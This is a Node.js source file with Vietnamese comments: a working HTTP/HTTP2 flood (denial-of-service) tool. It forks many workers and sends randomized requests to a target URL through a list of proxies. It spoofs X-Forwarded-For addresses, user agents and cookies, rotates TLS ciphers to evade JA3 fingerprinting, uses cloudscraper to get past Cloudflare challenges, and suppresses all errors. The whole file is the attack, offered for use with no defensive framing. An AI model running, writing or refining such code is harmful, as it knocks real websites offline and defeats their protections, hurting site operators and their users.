const url = require('url');
const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const request = require('request');
const cluster = require('cluster');
const fakeua = require('fake-useragent');
const randstr = require('randomstring');
const cloudscraper = require('cloudscraper');
const SocksProxyAgent = require('socks-proxy-agent').SocksProxyAgent;

// Danh sách cipher TLS (hỗ trợ JA3 fingerprint)
const ciphers = [
  'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
  'GREASE:X25519:x25519',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5'
];

// Danh sách header
const acceptHeaders = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];
const langHeaders = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.8',
  'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
  'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
  'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
  'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
];
const encodingHeaders = [
  'gzip, deflate, br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'deflate, gzip;q=1.0, *;q=0.5',
  '*'
];
const cacheControlHeaders = [
  'no-cache',
  'no-store',
  'no-transform',
  'only-if-cached',
  'max-age=0'
];
const methods = ['GET', 'HEAD', 'POST'];
const randomPaths = [
  '/', '/index.html', '/about', '/contact', '/api', '/login', '/signup',
  '/search', '/products', '/cart', '/profile', '/blog', '/news', '/sitemap'
];

// Danh sách lỗi được bỏ qua
const ignoreErrors = [
  'RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError',
  'ParserError', 'ECONNRESET', 'ESOCKETTIMEDOUT', 'ETIMEDOUT', 'ECONNREFUSED',
  'EHOSTUNREACH', 'EPIPE', 'EPROTO', 'ERR_ASSERTION', 'SELF_SIGNED_CERT_IN_CHAIN'
];

// Hàm chọn ngẫu nhiên
function randomItem(array) {
  return array[Math.floor(Math.random() * array.length)];
}

// Hàm tạo số ngẫu nhiên (0-255)
function randomByte() {
  return Math.round(Math.random() * 255);
}

// Hàm tạo IP ngẫu nhiên (không phải IP private)
function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip) ? randomIp() : ip;
}

// Hàm tạo cookie ngẫu nhiên
function randomCookie() {
  return `session=${randstr.generate(16)}; user=${randstr.generate(8)}; cf_clearance=${randstr.generate(32)}`;
}

// Hàm tạo dữ liệu POST ngẫu nhiên
function randomPostData() {
  return `data=${randstr.generate(20)}&id=${randstr.generate(10)}`;
}

// Lấy tham số dòng lệnh
const target = process.argv[2]; // URL mục tiêu
const time = parseInt(process.argv[3]); // Thời gian chạy (giây)
const threads = parseInt(process.argv[4]); // Số luồng
const proxyFile = process.argv[5]; // File chứa danh sách proxy
const rps = parseInt(process.argv[6]); // Requests per second
const proxies = fs.readFileSync(proxyFile, 'utf-8').match(/\S+/g); // Đọc danh sách proxy

// Bỏ qua các lỗi không mong muốn
process.on('uncaughtException', () => {}).on('unhandledRejection', () => {}).on('warning', () => {}).setMaxListeners(0);

// Hàm chọn proxy ngẫu nhiên
function randomProxy() {
  return randomItem(proxies);
}

// Hàm kiểm tra proxy (đơn giản hóa)
async function checkProxy(proxy) {
  try {
    const [host, port] = proxy.split(':');
    const options = {
      method: 'GET',
      uri: 'http://httpbin.org/ip',
      proxy: `http://${host}:${port}`,
      timeout: 3000
    };
    await cloudscraper(options);
    return true;
  } catch (err) {
    return false;
  }
}

// Hàm gửi yêu cầu flood
async function flood() {
  try {
    const parsedUrl = url.parse(target);
    const userAgent = fakeua();
    const cipher = randomItem(ciphers);
    const proxy = randomProxy();
    const [proxyHost, proxyPort] = proxy.split(':');
    const method = randomItem(methods);
    const path = randomItem(randomPaths) + `?q=${randstr.generate(8)}`;
    const randomIpAddr = randomIp();

    // Header cho HTTP2
    const headers = {
      ':method': method,
      ':authority': parsedUrl.host,
      ':path': path,
      ':scheme': 'https',
      'X-Forwarded-For': randomIpAddr,
      'user-agent': userAgent,
      'Origin': target,
      'accept': randomItem(acceptHeaders),
      'accept-encoding': randomItem(encodingHeaders),
      'accept-language': randomItem(langHeaders),
      'referer': target,
      'cookie': randomCookie(),
      'cache-control': randomItem(cacheControlHeaders),
      'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': method === 'POST' ? 'empty' : 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1'
    };

    // Sử dụng cloudscraper để xử lý thử thách Cloudflare
    const options = {
      method: method,
      uri: target + path,
      headers: headers,
      proxy: proxy.startsWith('socks') ? proxy : `http://${proxy}`,
      agent: proxy.startsWith('socks') ? new SocksProxyAgent(proxy) : undefined,
      followAllRedirects: true,
      maxRedirects: 10,
      gzip: true,
      jar: request.jar(),
      timeout: 5000,
      body: method === 'POST' ? randomPostData() : undefined,
      resolveWithFullResponse: true
    };

    // Gửi yêu cầu qua cloudscraper
    const response = await cloudscraper(options);
    if (response.statusCode === 200) {
      console.log(`[Success] ${method} ${target}${path} -> ${response.statusCode}`);
    }

    // Gửi yêu cầu HTTP2
    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 30000,
      maxSockets: 1000,
      maxTotalSockets: 1000
    });

    const req = http.request({
      host: proxyHost,
      agent: agent,
      globalAgent: agent,
      port: proxyPort,
      headers: {
        'Host': parsedUrl.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive'
      },
      method: 'CONNECT',
      path: parsedUrl.host + ':443'
    }, () => {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', (res, socket) => {
      const tlsConnection = tls.connect({
        host: parsedUrl.host,
        port: 443,
        servername: parsedUrl.host,
        secureProtocol: ['TLSv1_3_method', 'TLSv1_2_method', 'TLSv1_1_method'],
        ciphers: cipher,
        secure: true,
        honorCipherOrder: true,
        rejectUnauthorized: false,
        sessionTimeout: 5000,
        ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1'],
        socket
      }, () => {
        const client = http2.connect(parsedUrl.href, {
          createConnection: () => tlsConnection,
          settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          }
        }, () => {
          for (let i = 0; i < rps; i++) {
            const streamPath = randomItem(randomPaths) + `?q=${randstr.generate(8)}`;
            const stream = client.request({ ...headers, ':path': streamPath });
            stream.setEncoding('utf8');
            stream.on('data', () => {});
            stream.on('response', () => stream.close());
            stream.on('error', () => {});
            stream.end();
          }
        });
      });
    });

    req.on('error', () => {});
    req.end();
  } catch (err) {
    if (!ignoreErrors.includes(err.name || err.message)) {
      console.error(`[Error] ${err.message}`);
    }
  }
}

// Logic chính
if (cluster.isMaster) {
  console.log(`Your Target: ${target} | Threads: ${threads} | RPS: ${rps} | Supercharged by @Grok`);
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  setInterval(async () => {
    // Gửi nhiều yêu cầu đồng thời
    const promises = [];
    for (let i = 0; i < rps; i++) {
      promises.push(flood());
    }
    await Promise.all(promises);
  }, 1000);
}